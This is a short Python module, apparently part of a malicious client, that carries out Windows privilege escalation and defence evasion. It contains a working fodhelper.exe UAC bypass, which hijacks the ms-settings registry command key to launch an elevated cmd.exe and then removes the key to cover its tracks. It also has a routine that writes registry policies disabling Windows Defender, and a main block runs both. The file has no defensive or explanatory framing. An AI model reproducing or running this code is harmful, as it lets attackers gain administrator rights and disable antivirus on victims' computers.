# Registry system - Mirrors client.py bypasses
import ctypes
import platform
import subprocess
import time

def is_admin():
    if platform.system() != 'Windows':
        return False
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def uac_bypass():
    if platform.system() != 'Windows':
        return {'status': 'failed', 'error': 'Windows required'}
    try:
        import winreg
        reg_path = r"Software\Classes\ms-settings\shell\open\command"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "cmd.exe")
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        subprocess.run(["fodhelper.exe"], creationflags=8, check=False)
        time.sleep(2)
        
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        
        return {'status': 'success'}
    except Exception as e:
        return {'status': 'failed', 'error': str(e)}

def disable_defender():
    if platform.system() != 'Windows':
        return {'status': 'failed', 'error': 'Windows required'}
    try:
        import winreg
        keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiVirus", 1),
        ]
        
        success = 0
        for hive, path, name, value in keys:
            try:
                with winreg.CreateKey(hive, path) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                success += 1
            except:
                pass
        
        return {'status': 'success' if success else 'failed', 'modified': success}
    except Exception as e:
        return {'status': 'failed', 'error': str(e)}

if __name__ == "__main__":
    print(f"Admin: {is_admin()}")
    if not is_admin():
        print(f"UAC bypass: {uac_bypass()}")
    print(f"Defender disable: {disable_defender()}")